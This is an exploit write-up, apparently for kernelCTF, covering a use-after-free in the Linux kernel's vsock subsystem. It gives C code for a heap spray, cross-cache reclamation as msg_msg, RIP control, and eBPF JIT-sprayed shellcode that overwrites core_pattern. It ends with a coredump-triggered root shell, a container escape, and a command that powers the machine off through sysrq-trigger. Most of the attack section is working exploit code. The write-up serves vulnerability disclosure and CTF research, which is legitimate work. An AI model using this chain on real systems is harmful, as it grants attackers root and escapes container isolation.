# Vulnerability

This vulnerability occurs in the Linux kernel's vsock subsystem, specifically due to improper handling of socket bindings during transport reassignment. When a vsock is created and bound (either explicitly via bind() or implicitly via autobind during a connection), improper reference count management leads to premature removal and deallocation of the socket (use-after-free). Specifically, the kernel incorrectly removes and decreases `struct vsock_sock`'s reference count without ensuring it was properly bound, resulting in `struct vsock_sock` being freed prematurely. Consequently, further access to this freed `struct vsock_sock` causes a use-after-free condition, potentially allowing attackers to exploit freed `struct vsock_sock`.


# Exploit Tech Detail
The exploit is consist in the following steps
* EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)
* Spray as many anonymous memory as possible to full the kernel heap memory
* Use cross-cache tech to reclaim freed `struct vsock_sock` as `struct msg_msg`
* Call __vsock_release to RIP Control
* Achieve container escape.

## EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)
This technique we used to bypass KASLR.  This technique we're able to predict/guess the physmap address of the anonymous memory in kernel heap. You can find the details about this technique [here](https://www.willsroot.io/2022/12/entrybleed.html).

## Spray as many anonymous memory as possible to full the kernel heap memory

```C
// Spray as many anonymous memory as possible to full the kernel heap memory
int spray_anon_map()
{
	size_t *addr = SYSCHK(mmap(0, 0x30000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0));
	for (int i = 0; i < 0x30000000 / 8; i++)
	{
		addr[i] = 0xffffffffcc000000 - 0x800;
	}
}
```

We implements a memory spraying technique to exhaust kernel heap memory by allocating a large anonymous shared memory region (0x30000000 bytes, approximately 768 MB) using the mmap system call. It fills this allocated memory with a specific kernel-space address (0xffffffffcc000000 - 0x800), which is our guessd ebpf address


## Use cross-cache tech to reclaim freed `struct vsock_sock` as `struct msg_msg`

With cross-cache tech, we can reclaim victim skb as msg_msg which is under `kmalloc-cg-1024` cache like following example code.

* Allocate a lot vsock_sock between victim
```c
	// Allocate some `struct vsock_sock` before victim
	for (int i = 0; i < 0x100; i++)
		cross[i] = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));

	fd = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));

	// Allocate some `struct vsock_sock` after victim
	for (int i = 0; i < 0x100; i++)
		cross[i + 0x100] = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));

```

* Free them all and reclaim as msg_msg
```c

	// free all `struct vsock_sock`
	for (int i = 0; i < 0x100; i++)
		close(cross[i]);

	vsock_connect_fd(fd, VMADDR_CID_HOST, VMADDR_PORT_ANY);

	// free all `struct vsock_sock`
	for (int i = 0; i < 0x100; i++)
		close(cross[i + 0x100]);

	for (int i = 0; i < 0x4000; i++)
		SYSCHK(msgsnd(msqid[i], &msg, KMALLOC_CG_1k - KMALLOC_CG_1k, 0));


## RIP Control
We set `vsk->transport` to our guessed kernel heap which contents is our guessed ebpf address.

```c
static void __vsock_release(struct sock *sk, int level)
{
	if (sk) {
		struct sock *pending;
		struct vsock_sock *vsk;

		vsk = vsock_sk(sk);
		pending = NULL;	/* Compiler warning. */

		/* When "level" is SINGLE_DEPTH_NESTING, use the nested
		 * version to avoid the warning "possible recursive locking
		 * detected". When "level" is 0, lock_sock_nested(sk, level)
		 * is the same as lock_sock(sk).
		 */
		lock_sock_nested(sk, level);

		if (vsk->transport)
			vsk->transport->release(vsk);
```


## Achieve container escape
### Spray eBPF programs

We use the same tech as mention in https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-36972_lts_cos/docs/exploit.md#achieve-container-escape

Our goal is to do some eBPF JIT spraying so later when we control kernel RIP, it will jump to the JIT page and execute our shellcode.

Linux kernel provide a socket option `SO_ATTACH_FILTER` and let user to attach a classic BPF program to the socket for use as a filter of incoming packets.

By creating lots of sockets and attach to classic BPF program, we can spray a lot of eBPF programs in kernel.
```cpp
    struct sock_fprog prog = {
        .len =  TSIZE,
        .filter = filter,
    };
    for(int i=0;i<NUM;i++){
        int fd[2];
        SYSCHK(socketpair(AF_UNIX,SOCK_DGRAM,0,fd));
        SYSCHK(setsockopt(fd[0],SOL_SOCKET,26,&prog,sizeof(prog)));
    }
```

As for the shellcode in our eBPF program, our goal is to overwrite  `/proc/sys/kernel/core_pattern` so later we can execute command as root by triggering crash. Here's what our shellcode did to achieve our goal:
* Use the `rdmsr` instruction to obtain the kernel text address. With RCX being set to MSR_LSTAR ( `0xc0000082` ), we'll be able to obtain the address of `entry_SYSCALL_64`.
* Calculate the address of `core_pattern` and `_copy_from_user`.
* Call `_copy_from_user(core_pattern, user_buf, 0x30);`, where `user_buf` is a buffer in user space that stores the content we want to overwrite in `core_pattern`. 

We construct our eBPF program with the following form:

```cpp
struct sock_filter table[] = {
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        .....................
};
```

The above example will be compiled into the following instructions after JIT:

```
b8 90 90 90 b3    mov eax, 0xb3909090
b8 90 90 90 b3    mov eax, 0xb3909090
```

If we can control kernel RIP to jump into the NOP instruction ( 0x90 ), the code will become:

```
90       nop 
b3 b8    mov    bl, 0xb8
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
....
```

We can see that by using an extra byte `0xb3`, we can skip the useless byte `0xb8` and execute our own shellcode. Notice that due to the "skipping part", we only have 3 bytes of space in each instruction, so we'll have to take care of that as well during our shellcode construction.

### Post RIP

Once we control the kernel RIP and jump into the middle of our eBPF program, the shellcode we crafted will cause core_pattern being overwritten to `|/proc/%P/fd/666 %P %P`:

We then use memfd and write an executable file payload in fd 666.
```C
int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}
```

Later when coredump happened, it will execute our executable file as root in root namespace:
```C
*(size_t*)0=0; //trigger coredump
```

Spawn shell when coredump happened. This is the code looks like:
```c++

		// #define SYS_pidfd_getfd 438
		int pid = strtoull(argv[2], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);

```